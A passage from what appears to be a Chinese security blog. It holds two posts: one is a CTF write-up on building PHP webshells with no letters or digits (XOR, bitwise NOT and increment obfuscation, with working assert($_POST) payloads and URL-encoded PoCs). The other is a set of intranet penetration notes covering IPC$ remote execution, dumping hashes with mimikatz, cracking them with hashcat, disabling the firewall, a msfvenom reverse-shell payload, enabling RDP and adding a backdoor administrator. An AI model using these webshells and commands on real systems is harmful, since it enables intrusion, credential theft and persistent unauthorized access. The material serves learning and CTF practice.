title=\"三、方法一\"></a>三、方法一</h3><p>使用异或运算，两个字符串异或操作之后，得到的还是一个字符串，所以我们可以通过两个字符异或运算来得到另外一个字符。</p>\n<blockquote>\n<p>写的PHP代码来得到我们想要的字符串：</p>\n</blockquote>\n<pre><code>&lt;?php\n/**\n * 1、我需要做什么？\n * 我需要的是将两个非字母数字的字符异或之后得到某个字母\n * 2、我该怎么做？\n *      使用一个循环来跟指定的字符进行异或，再判断是否是我们想要的内容\n */\n$a = &quot;]&quot;;\n// 这个值必须是没有被过滤的值\n$argv = str_split(&quot;POST&quot;);\n// 这里是你要异或得到的值\nfor ($i = 0; $i &lt; count($argv); $i++) &#123;\n    for ($j = 0; $j &lt; 255; $j++) &#123;\n        $k = chr($j) ^ $a;\n        if ($k == $argv[$i]) &#123;\n            $flag = dechex($j);\n            if (strlen($flag) &lt; 2) &#123;\n                $flag = &quot;%0&quot; . $flag;\n                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;\n            &#125; else &#123;\n                $flag = &quot;%&quot; . $flag;\n                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>写的勉勉强强，大佬别骂……</p>\n<p>然后我们可以构造这样的内容</p>\n<pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=assert$__=&#39;_&#39;.(&#39;%0d&#39;^&#39;]&#39;).(&#39;%12&#39;^&#39;]&#39;).(&#39;%0e&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=_POST$___=$$__;$_($___[_]); // assert($_POST[_]);\n</code></pre>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-150-1024x539.png\"></p>\n<blockquote>\n<p>这里有一个疑问，为什么前面的assert跟<code>]</code>搭配就没作用了，后面的POST跟&#96;&#96;&#96;搭配也没有作用</p>\n</blockquote>\n<p>这里还有一个别人的脚本</p>\n<pre><code>&lt;?php\n$l = &quot;&quot;;\n$r = &quot;&quot;;\n$argv = str_split(&quot;POST&quot;);\nfor ($i = 0; $i &lt; count($argv); $i++) &#123;\n    for ($j = 0; $j &lt; 255; $j++) &#123;\n        $k = chr($j) ^ chr(255);\n        // dechex(255) = ff\n        if ($k == $argv[$i]) &#123;\n            if ($j &lt; 16) &#123;\n                $l .= &quot;%ff&quot;;\n                $r .= &quot;%0&quot; . dechex($j);\n                continue;\n            &#125;\n            $l .= &quot;%ff&quot;;\n            $r .= &quot;%&quot; . dechex($j);\n            continue;\n        &#125;\n    &#125;\n&#125;\necho &quot;(&#39;$l&#39;^&#39;$r&#39;)&quot;;\n?&gt;\n\n// poc$_=(&#39;%ff%ff%ff%ff%ff%ff&#39;^&#39;%9e%8c%8c%9a%8d%8b&#39;);// assert$__=&#39;_&#39;.(&#39;%ff%ff%ff%ff&#39;^&#39;%af%b0%ac%ab&#39;);// _POST$___=$$__;// $_POST$_($___[_]);// assert($_POST[_])\n</code></pre>\n<p>也是可以使用的</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-152-1024x531.png\"></p>\n<blockquote>\n<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>\n<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>\n</blockquote>\n<h3 id=\"四、方法二\"><a href=\"#四、方法二\" class=\"headerlink\" title=\"四、方法二\"></a>四、方法二</h3><p>这个方法和第一个方法是差不多的，但是编写脚本……算了吧，我还是使用大佬现成的吧。这个方法是利用取反来得到字母，比如<code>&#39;和&#39;&#123;2&#125;</code>得到的结果为<code>\\x8c</code>，取反得到的字母为<code>s</code>。这里想不太明白，复现成功，PHP版本会产生一定的影响，先放在这里，找时间来看看</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-92.png\"></p>\n<pre><code>&lt;?php\n$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);\n$_ = $__ / $__;\n$____ = &#39;&#39;;\n$___ = &quot;瞰&quot;;\n$____ .= ~($___&#123;$_&#125;);\n$___ = &quot;和&quot;;\n$____ .= ~($___&#123;$__&#125;);\n$___ = &quot;和&quot;;\n$____ .= ~($___&#123;$__&#125;);\n$___ = &quot;的&quot;;\n$____ .= ~($___&#123;$_&#125;);\n$___ = &quot;半&quot;;\n$____ .= ~($___&#123;$_&#125;);\n$___ = &quot;始&quot;;\n$____ .= ~($___&#123;$__&#125;);\n$_____ = &#39;_&#39;;\n$___ = &quot;俯&quot;;\n$_____ .= ~($___&#123;$__&#125;);\n$___ = &quot;瞰&quot;;\n$_____ .= ~($___&#123;$__&#125;);\n$___ = &quot;次&quot;;\n$_____ .= ~($___&#123;$_&#125;);\n$___ = &quot;站&quot;;\n$_____ .= ~($___&#123;$_&#125;);\n$_ = $$_____;\n$____($_[$__]);\n</code></pre>\n<p>这里最好进行一次url编码</p>\n<blockquote>\n<p>poc</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">poc:%24%20%3D%20(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%2B(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%3B%24_%20%3D%20%24%20%2F%20%24%3B%24_%20%3D%20&#x27;&#x27;%3B%24%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%9A%84%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%8D%8A%22%3B%24%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%A7%8B%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20&#x27;</span><br><span class=\"line\">_&#x27;%3B%24_</span><br><span class=\"line\">%20%3D%20%22%E4%BF%AF%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E6%AC%A1%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%AB%99%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%24%24_%3B%0A%24(%24_%5B%24__%5D)%3B</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-153-1024x540.png\"></p>\n<blockquote>\n<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>\n<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>\n</blockquote>\n<p>这里是利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP是弱类型语言，true的值为1，所以<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code></p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-96-1024x162.png\"></p>\n<blockquote>\n<p>将上面的代码运行一下（这里还有一些注释，大佬果然不一样啊……）</p>\n</blockquote>\n<pre><code>&lt;?php\n$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);\n// $__ = 2\n$_ = $__ / $__;\n// $_ = 1\n$____ = &#39;&#39;;\n$___ = &quot;瞰&quot;;\n$____ .= ~($___&#123;$_&#125;);\n// $___ = ~(&quot;瞰&quot;&#123;1&#125;) =&gt; a\n$___ = &quot;和&quot;;\n$____ .= ~($___&#123;$__&#125;);\n// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; as\n$___ = &quot;和&quot;;\n$____ .= ~($___&#123;$__&#125;);\n// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; ass\n$___ = &quot;的&quot;;\n$____ .= ~($___&#123;$_&#125;);\n// $___ = ~(&quot;的&quot;&#123;1&#125;) =&gt; asse\n$___ = &quot;半&quot;;\n$____ .= ~($___&#123;$_&#125;);\n// $___ = ~(&quot;半&quot;&#123;1&#125;) =&gt; asser\n$___ = &quot;始&quot;;\n$____ .= ~($___&#123;$__&#125;);\n// $___ = ~(&quot;始&quot;&#123;2&#125;) =&gt; assert\n//# 最后:$____ = assert\n$_____ = &#39;_&#39;;\n$_____ = &#39;_&#39;;\n$___ = &quot;俯&quot;;\n$_____ .= ~($___&#123;$__&#125;);\n// $___ = ~(&quot;俯&quot;&#123;2&#125;) =&gt; _P\n$___ = &quot;瞰&quot;;\n$_____ .= ~($___&#123;$__&#125;);\n// $___ = ~(&quot;瞰&quot;&#123;2&#125;) =&gt; _PO\n$___ = &quot;次&quot;;\n$_____ .= ~($___&#123;$_&#125;);\n// $___ = ~(&quot;次&quot;&#123;1&#125;) =&gt; _POS\n$___ = &quot;站&quot;;\n$_____ .= ~($___&#123;$_&#125;);\n// $___ = ~(&quot;站&quot;&#123;1&#125;) =&gt; _POST\n// 最后:$_____ = _POST\n$_ = $$_____;// $_POST\n$____($_[$__]);// assert($_POST[2])\n</code></pre>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-97-1024x543.png\"></p>\n<h3 id=\"五、方法三\"><a href=\"#五、方法三\" class=\"headerlink\" title=\"五、方法三\"></a>五、方法三</h3><p>方法二是使用了位运算，方法三是不再使用位运算来搞定这个题目的，完全阐释了这两张图啊，大佬才能想出来的东西，我直接好家伙……</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-98.png\"><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-99.png\"><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-100-1024x543.png\"></p>\n<p>说了这么多，其实就是<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>,<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>，所以我们只要拿到一个变量就可以得到所以的变量了</p>\n<p>这时候大佬又正好了，而我是直接放弃了……数组中可以得到大小写a，就相当于我们拿到了所有的字母</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-101-1024x119.png\"></p>\n<p>利用这个技巧，我们就可以编写如下的webshell了</p>\n<pre><code>&lt;?phphighlight_file(__FILE__);$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;// 因为A和S相差18，所以要$__++十八次，下面也是相同的道理n</code></pre>\n<p>php对大小写不敏感，所以使用<code>ASSERT($_POST[_]);</code>也是可以的，运行结果如下：</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-154-1024x539.png\"></p>\n<p>绕过也是成功的：</p>\n<p>老规矩，还是得进行url编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">%24%3D%5B%5D%3B%24%3D%40%22%24%22%3B%24%3D%24%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;</span><br><span class=\"line\">_&#x27;%3B%24__</span><br><span class=\"line\">%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24__%3B%24%3D%24%24%3B%24__(%24%5B_%5D)%3B</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-156-1024x541.png\"></p>\n<blockquote>\n<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>\n<p>5.4.45&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>\n</blockquote>\n<h1 id=\"提高篇\"><a href=\"#提高篇\" class=\"headerlink\" title=\"提高篇\"></a>提高篇</h1><blockquote>\n<p>源码：</p>\n</blockquote>\n<pre><code>&lt;?php\nif (isset($_GET[&#39;code&#39;])) &#123;\n    $code = $_GET[&#39;code&#39;];\n    if (strlen($code) &gt; 35) &#123;\n        die(&quot;Long.&quot;);\n    &#125;\n    if (preg_match(&quot;/[A-Za-z0-9_$]+/&quot;, $code)) &#123;\n        die(&quot;NO.&quot;);\n    &#125;\n    eval($code);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<h3 id=\"PHP7下绕过\"><a href=\"#PHP7下绕过\" class=\"headerlink\" title=\"PHP7下绕过\"></a>PHP7下绕过</h3><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。所以我们构造一个phpinfo字符串即可。</p>\n<p><img src=\"/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-176-1024x459.png\"></p>\n<h3 id=\"PHP5下绕过\"><a href=\"#PHP5下绕过\" class=\"headerlink\" title=\"PHP5下绕过\"></a>PHP5下绕过</h3><p>看的有点懵逼，有时间再看看，有兴趣的小伙伴可以去P神的原文看看，文章的顶部有链接，是我太菜了……</p>\n<p>再次感谢大佬的文章！</p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"内网渗透知识点","url":"/2023/07/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/","content":"<p>参考链接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://daiker.gitbook.io/windows-protocol/</span><br><span class=\"line\">https://www.cnblogs.com/-mo-/p/11813608.html</span><br><span class=\"line\">https://www.anquanke.com/post/id/170471</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"IPC\"><a href=\"#IPC\" class=\"headerlink\" title=\"IPC\"></a>IPC</h2><h3 id=\"0x01-简介\"><a href=\"#0x01-简介\" class=\"headerlink\" title=\"0x01 简介\"></a>0x01 简介</h3><p><code>IPC$</code>是共享”命名管道”的资源，他是为了让进程之间通信而开放的命名管道，可以验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p>\n<p>利用<code>IPC$</code>，连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。</p>\n<p>指至少两个进程或线程之间传送数据或信号的一些技术或方法。</p>\n<h3 id=\"0x02-利用条件\"><a href=\"#0x02-利用条件\" class=\"headerlink\" title=\"0x02 利用条件\"></a>0x02 利用条件</h3><ol>\n<li><code>139、445端口开启</code>：IPC$连接可以实现远程登录及对默认共享的访问，而139端口的开启表示netbios协议的应用，我们可以通过139、445（win2000）端口实现对共享文件&#x2F;打印机的访问，因此一般来讲，<code>IPC$</code>连接是需要139或445端口来支持的。</li>\n<li>管理员开启了默认共享：默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘（C$、D$、E$）和系统目录<code>winnt或windows(admin$)</code>，我们通过<code>IPC$</code>连接可以实现对这些默认共享的访问。</li>\n</ol>\n<h3 id=\"0x03-操作命令\"><a href=\"#0x03-操作命令\" class=\"headerlink\" title=\"0x03 操作命令\"></a>0x03 操作命令</h3><ol>\n<li><p>建立IPC$空连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\127.0.0.1\\Iipc$ &quot;&quot; /user:&quot;&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>建立完整的用户名，密码连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\127.0.0.1\\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>映射路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use z: \\\\127.0.0.1\\c$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>访问&#x2F;删除路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">直接访问：net use z: \\\\127.0.0.1\\c$</span><br><span class=\"line\">删除映射的C盘，其他盘类推：net use c: /del</span><br><span class=\"line\">删除全部，会有提示要求按y确认：net use * /del</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除IPC$连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\127.0.0.1\\ipc$ /del</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>域中进行IPC$连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use\\\\127.0.0.1\\ipc$ &quot;域成员密码&quot; /user:域名\\域成员账号</span><br><span class=\"line\">net use\\\\192.168.100.1\\ipc$ &quot;admin123456&quot; /user:monkey111.com\\win2003</span><br><span class=\"line\"></span><br><span class=\"line\">dir \\\\moneky111.com\\c$</span><br><span class=\"line\"></span><br><span class=\"line\">上传exe文件：copy test.exe \\\\monkey111.com\\c$</span><br><span class=\"line\"></span><br><span class=\"line\">net use \\\\192.168.100.1\\ipc$ /del</span><br><span class=\"line\"></span><br><span class=\"line\">查看时间：net time \\\\127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">运行程序：at \\\\127.0.0.1 时间 test.exe(时间要是后面的时间)</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"0x04-IPC-连接失败的原因\"><a href=\"#0x04-IPC-连接失败的原因\" class=\"headerlink\" title=\"0x04 IPC$连接失败的原因\"></a>0x04 IPC$连接失败的原因</h3><ol>\n<li>你的系统不是NT或以上的操作系统</li>\n<li>对方没有打开IPC$默认共享</li>\n<li>不能成功连接目标的139、445端口</li>\n<li>命令输入错误</li>\n<li>用户名或密码错误</li>\n</ol>\n<h3 id=\"0x05-常见错误号\"><a href=\"#0x05-常见错误号\" class=\"headerlink\" title=\"0x05 常见错误号\"></a>0x05 常见错误号</h3><ol>\n<li>错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限</li>\n<li>错误号51，Windows无法找到网络路径：网络有问题</li>\n<li>错误号53:，找不到网络路径：IP地址错误；目标为开机；目标lanmanserver服务为开启；目标有防火墙（端口过滤）；</li>\n<li>错误号67，找不到网络名：你的lanmanworkstation服务未启动；目标删除了IPC$</li>\n<li>错误号1219，提供的凭据域已存在的凭据集冲突；你已经和对方建立了一个IPC$，请删除再连</li>\n<li>错误号1326，未知的用户名或错误密码</li>\n<li>错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动（连接域控会出现此情况）</li>\n<li>错误号2242，此用户的密码已经过期：目标有账号策略，强制定期要求更改密码。</li>\n</ol>\n<h3 id=\"0x06-其他知识点\"><a href=\"#0x06-其他知识点\" class=\"headerlink\" title=\"0x06 其他知识点\"></a>0x06 其他知识点</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看自己的共享：net share</span><br><span class=\"line\">查看target-IP的共享：net view \\\\IP</span><br><span class=\"line\">获取target-IP的端口列表：netstat -A IP</span><br><span class=\"line\"></span><br><span class=\"line\">查看端口号对应的PID：netstat -ano | findstr &quot;post&quot;</span><br><span class=\"line\">查看进程号对应的程序：tasklist | findstr &quot;PID&quot;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">现在绝大多数的Windows操作系统默认策略不允许来自远程网络验证的空密码，所以IPC空连接已经被废弃</span><br><span class=\"line\">如果远程服务端未开启139、445端口，无法使用IPC$进行连接。\t</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SAM\"><a href=\"#SAM\" class=\"headerlink\" title=\"SAM\"></a>SAM</h2><p>SAM称为安全账户管理器，SAM是用来存储Windows操作系统密码的数据库文件，为了避免明文密码泄露，SAM文件中保存的是明文密码经过一系列算法处理过的Hsah值，被保存的Hash分为LM Hash、NTLMHash。用户在本地或远程登录系统时，会将Hash值与SAM文件中保存的Hash值进行对比。在后期的Windows系统中，SAM文件中被保存的密码Hash都被密钥SYSKEY加密。</p>\n<p>SAM文件在磁盘中的位置在<code>C:\\Windows\\system32\\config\\sam</code>，SAM文件在Windows系统启动后被系统锁定，无法进行移动和复制。</p>\n<h2 id=\"Hash\"><a href=\"#Hash\" class=\"headerlink\" title=\"Hash\"></a>Hash</h2><p>Windows系统为了保护用户明文密码不会被泄露，将明文密码转换为Hash值进行身份验证，被保存在SAM或ntds.dit中。</p>\n<h3 id=\"Hash背景\"><a href=\"#Hash背景\" class=\"headerlink\" title=\"Hash背景\"></a>Hash背景</h3><ol>\n<li>LM Hash，在早期的Windows操作系统中奖明文密码转换为LM Hash保存在SAM文件中，因为LM Hash使用DES加密，密钥为硬编码1，算法又存在缺陷，所以被废弃，为了保证系统兼容性可以自行开启。</li>\n<li>NTLM Hash，在LM Hash算法被弃用时，NTLM Hashneo用来进行Windows本地及远程身份验证的凭据，长度为32bit，由数字和字母组成。</li>\n</ol>\n<h3 id=\"Hash示例\"><a href=\"#Hash示例\" class=\"headerlink\" title=\"Hash示例\"></a>Hash示例</h3><p>冒号前半段为LM Hash，冒号后半段为NTLM Hash</p>\n<p>aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 net-NTLM Hash：admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030</p>\n<h3 id=\"Hash产生\"><a href=\"#Hash产生\" class=\"headerlink\" title=\"Hash产生\"></a>Hash产生</h3><ol>\n<li><p>LM Hash：略</p>\n</li>\n<li><p>NTLM Hash：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hex(16进制编码)</span><br><span class=\"line\">unicode编码</span><br><span class=\"line\">md4加密</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"获取Hash方法\"><a href=\"#获取Hash方法\" class=\"headerlink\" title=\"获取Hash方法\"></a>获取Hash方法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用卷影副本将SAM文件导出，配合SYSKEY利用mimikatz等工具获取NTLM Hash</span><br><span class=\"line\">使用mimikatz等工具读取lsass.exe进程，获取Hash</span><br><span class=\"line\">配合其他漏洞和手法获取net-NTLM Hash</span><br><span class=\"line\">net-NTLM Hash可以使用Responder或lnveigh等工具获取</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"破解Hash\"><a href=\"#破解Hash\" class=\"headerlink\" title=\"破解Hash\"></a>破解Hash</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">LM Hash</span><br><span class=\"line\">\t1. john --format=lm hash.txt</span><br><span class=\"line\">\t2. hashcat -m 3000 -a 3 hash.txt</span><br><span class=\"line\"></span><br><span class=\"line\">NTLM Hash</span><br><span class=\"line\">\t1. john --format=netntlm hash.txt</span><br><span class=\"line\">\t2. hashcat -m 1000 -a 3 hash.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Net-NTLMv1</span><br><span class=\"line\">\t1. john --format-netntlm hash.txt</span><br><span class=\"line\">\t2. hashcat -m 5500 -a 3 hash.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Net-NTLMv2</span><br><span class=\"line\">\t1. john --format=netntlmv2 hash.txt</span><br><span class=\"line\">\t2. hashcat -m 5600 -a 3 hash.txt</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内网信息搜集常见的命令\"><a href=\"#内网信息搜集常见的命令\" class=\"headerlink\" title=\"内网信息搜集常见的命令\"></a>内网信息搜集常见的命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net view                 # 查看局域网内其他主机名</span><br><span class=\"line\">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class=\"line\">net user                 # 查看本机用户列表</span><br><span class=\"line\">net user /domain         # 查看域用户</span><br><span class=\"line\">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class=\"line\">net view /domain         # 查看有几个域</span><br><span class=\"line\">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class=\"line\">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class=\"line\">net group 组名 /domain    # 查看域中某工作组</span><br><span class=\"line\">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class=\"line\">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class=\"line\">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class=\"line\"></span><br><span class=\"line\">netsh advfirewall show allprofiles\t# 查看当前防火墙状态</span><br><span class=\"line\">netsh advfirewall set allprofiles state off \t# 关闭防火墙</span><br><span class=\"line\"></span><br><span class=\"line\">route print \t# 查看路由信息</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用msf进行内网渗透\"><a href=\"#使用msf进行内网渗透\" class=\"headerlink\" title=\"使用msf进行内网渗透\"></a>使用msf进行内网渗透</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -platform windows -p windows/meterpreter/reverse_tcp Lhost=192.168.1.3 lport=4444 -b&quot;\\x00&quot; -e x86/shikata_ga_nai -f exe &gt;  ./payload2.exe</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他常见命令\"><a href=\"#其他常见命令\" class=\"headerlink\" title=\"其他常见命令\"></a>其他常见命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\t# 开启远程桌面服务</span><br><span class=\"line\">route print\t\t# 查看当前的路由信息</span><br><span class=\"line\">net user monkey111 xsl.200234 /add \t# 新建用户</span><br><span class=\"line\">net localgroup administrators monkey111 /add\t# 